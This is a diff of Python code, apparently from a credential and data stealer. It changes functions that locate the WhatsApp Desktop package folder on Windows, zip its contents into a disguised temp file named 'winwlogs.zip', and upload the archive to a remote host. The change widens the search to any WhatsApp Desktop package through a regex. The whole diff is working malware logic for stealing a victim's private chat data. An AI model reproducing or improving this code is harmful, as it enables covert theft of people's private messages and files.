@@ -2373,17 +2373,17 @@ def list_files_in_directory(directory, level=0, max_display=100):
 def Get_Whatsapp(base_directory, zip_file_path):
     try:
         all_files = []
-
+        whatsapp_regex = re.compile(r"^[a-z0-9]+\.WhatsAppDesktop_[a-z0-9]+$")
         for root, dirs, files in os.walk(base_directory):
-            for file in files:
-                file_path = os.path.join(root, file)
-                if os.path.isdir(file_path) and not os.listdir(file_path):
-                    continue
-
-                all_files.append(file_path)
+            if whatsapp_regex.search(os.path.basename(root)):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    if os.path.isdir(file_path) and not os.listdir(file_path):
+                        continue
+                    
+                    all_files.append(file_path)
 
         num_files = len(all_files)
-
         if num_files <= 1000:
             with zipfile.ZipFile(zip_file_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
                 for file_path in all_files:
@@ -2398,13 +2398,14 @@ def Get_Whatsapp(base_directory, zip_file_path):
             return "Too many files to display", zip_file_path
     except Exception as e:
         error_Handler(e)
-    
+
 def Upload_Whatsapp():
     try:
-        x, y = Get_Whatsapp(f"{os.getenv('LOCALAPPDATA')}\\Packages\\5319275A.WhatsAppDesktop_cv1g1gvanyjgm", os.path.join(os.getenv("TEMP"), "winwlogs.zip"))
+        x, y = Get_Whatsapp(f"{os.getenv('LOCALAPPDATA')}\\Packages\\", os.path.join(os.getenv("TEMP"), "winwlogs.zip"))
         if logfile == True:
             move_file_to_temp_folder(y)
             return
+        
         url = upload_file(y)
 
 
